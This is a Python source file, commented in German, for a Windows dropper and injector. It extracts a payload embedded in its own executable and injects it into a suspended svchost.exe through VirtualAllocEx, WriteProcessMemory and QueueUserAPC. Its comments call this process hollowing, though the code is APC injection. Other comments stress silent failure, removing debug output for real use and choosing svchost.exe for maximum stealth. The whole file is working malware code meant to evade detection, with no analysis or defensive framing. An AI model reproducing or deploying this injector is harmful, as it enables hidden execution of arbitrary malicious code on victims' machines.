import ctypes
from ctypes import wintypes
import sys
import os

# ... [Alle API Definitionen bleiben gleich wie in injector.py] ...
# Prozess-Erstellungs-Flags
CREATE_SUSPENDED = 0x00000004
DETACHED_PROCESS = 0x00000008

# Speicher-Flags
MEM_COMMIT = 0x00001000
MEM_RESERVE = 0x00002000
PAGE_EXECUTE_READWRITE = 0x40

# Nötige Strukturen für CreateProcessA
class STARTUPINFOA(ctypes.Structure):
    _fields_ = [
        ("cb", wintypes.DWORD),
        ("lpReserved", wintypes.LPSTR),
        ("lpDesktop", wintypes.LPSTR),
        ("lpTitle", wintypes.LPSTR),
        ("dwX", wintypes.DWORD),
        ("dwY", wintypes.DWORD),
        ("dwXSize", wintypes.DWORD),
        ("dwYSize", wintypes.DWORD),
        ("dwXCountChars", wintypes.DWORD),
        ("dwYCountChars", wintypes.DWORD),
        ("dwFillAttribute", wintypes.DWORD),
        ("dwFlags", wintypes.DWORD),
        ("wShowWindow", wintypes.WORD),
        ("cbReserved2", wintypes.WORD),
        ("lpReserved2", ctypes.POINTER(wintypes.BYTE)),
        ("hStdInput", wintypes.HANDLE),
        ("hStdOutput", wintypes.HANDLE),
        ("hStdError", wintypes.HANDLE),
    ]

class PROCESS_INFORMATION(ctypes.Structure):
    _fields_ = [
        ("hProcess", wintypes.HANDLE),
        ("hThread", wintypes.HANDLE),
        ("dwProcessId", wintypes.DWORD),
        ("dwThreadId", wintypes.DWORD),
    ]

# --- Implementierung des Dropper/Injectors ---

PAYLOAD_MARKER = b"###PAYLOAD_START###"

def get_payload():
    """Liest die Payload aus der eigenen ausführbaren Datei."""
    try:
        # Finde den Pfad zur aktuell laufenden .exe
        executable_path = sys.executable
        with open(executable_path, "rb") as f:
            full_content = f.read()
        
        marker_pos = full_content.find(PAYLOAD_MARKER)
        if marker_pos == -1:
            # print("[-] Fehler: Payload-Marker nicht in der ausführbaren Datei gefunden.")
            return None
            
        # Die Payload beginnt direkt nach dem Marker
        payload_start = marker_pos + len(PAYLOAD_MARKER)
        return full_content[payload_start:]
    except Exception as e:
        # Im Einsatzfall sollte hier kein Print stehen, nur für Debugging
        # print(f"[-] Fehler beim Extrahieren der Payload: {e}")
        return None


def run(target_process):
    """Führt die Process Hollowing Technik mit der eingebetteten Payload durch."""
    
    payload_buffer = get_payload()
    if not payload_buffer:
        return # Lautloses Scheitern

    payload_size = len(payload_buffer)

    startup_info = STARTUPINFOA()
    startup_info.cb = ctypes.sizeof(startup_info)
    process_info = PROCESS_INFORMATION()

    try:
        created = ctypes.windll.kernel32.CreateProcessA(
            ctypes.c_char_p(target_process.encode('utf-8')),
            None, None, None, False,
            CREATE_SUSPENDED | DETACHED_PROCESS,
            None, None,
            ctypes.byref(startup_info),
            ctypes.byref(process_info)
        )
        if not created:
            return
    except:
        return # Lautloses Scheitern

    h_process = process_info.hProcess
    h_thread = process_info.hThread

    remote_mem = ctypes.windll.kernel32.VirtualAllocEx(
        h_process, None, payload_size,
        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE
    )
    if not remote_mem:
        ctypes.windll.kernel32.TerminateProcess(h_process, 1)
        return

    bytes_written = ctypes.c_size_t(0)
    write_success = ctypes.windll.kernel32.WriteProcessMemory(
        h_process, remote_mem, payload_buffer, payload_size, ctypes.byref(bytes_written)
    )
    if not write_success:
        ctypes.windll.kernel32.TerminateProcess(h_process, 1)
        return

    lp_thread_start_routine = ctypes.cast(remote_mem, ctypes.WINFUNCTYPE(wintypes.DWORD, wintypes.LPVOID))
    apc_queued = ctypes.windll.kernel32.QueueUserAPC(lp_thread_start_routine, h_thread, None)
    if not apc_queued:
        ctypes.windll.kernel32.TerminateProcess(h_process, 1)
        return

    ctypes.windll.kernel32.ResumeThread(h_thread)
    ctypes.windll.kernel32.CloseHandle(h_process)
    ctypes.windll.kernel32.CloseHandle(h_thread)

if __name__ == "__main__":
    # Hartcodiertes Ziel für maximale Tarnung. svchost.exe ist eine gute Wahl.
    TARGET = r"C:\Windows\System32\svchost.exe"
    run(TARGET) 